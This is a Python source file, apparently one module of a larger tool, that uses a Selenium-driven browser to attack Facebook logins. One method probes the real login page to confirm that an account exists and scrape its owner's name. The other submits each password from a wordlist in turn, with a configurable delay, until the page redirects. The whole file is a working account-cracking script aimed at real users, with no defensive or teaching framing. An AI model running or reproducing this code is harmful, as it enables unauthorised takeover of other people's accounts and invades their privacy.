import time

class Facebook:

    def __init__(self, browser):
        self.browser = browser

    def set_config(self, username, wordlist, delay):
        self.username = username
        self.name = ''
        self.wordlist = wordlist
        self.delay = delay
        self.url = 'https://www.facebook.com/login.php'

    def check_user(self):
        self.browser.driver.get(self.url)
        email = self.browser.driver.find_element_by_id('email')
        email.send_keys(self.username)
        form = self.browser.driver.find_element_by_id('login_form')
        form.submit()
        
        try:
            name = self.browser.driver.find_element_by_xpath("//span[contains(text(), 'Log In as')]")
            if name:
                self.name = name.text.replace('Log In as ','')
                return True
            else:
                return False
        except:
            return False

    def crack(self):
        passwords = []
        found = ''
        with open(self.wordlist, 'r') as f:
            for line in f:
                passwords.append(line.strip('\n'))
        for password in passwords:
            self.browser.driver.get(self.url)
            email = self.browser.driver.find_element_by_id('email')
            email.send_keys(self.username)
            pwd = self.browser.driver.find_element_by_id('pass')
            pwd.send_keys(password)

            form = self.browser.driver.find_element_by_id('login_form')
            form.submit()

            url = self.browser.driver.current_url
            if (url != self.url) and (not 'login_attempt' in url):
                found = password
                break
            time.sleep(self.delay)

        return found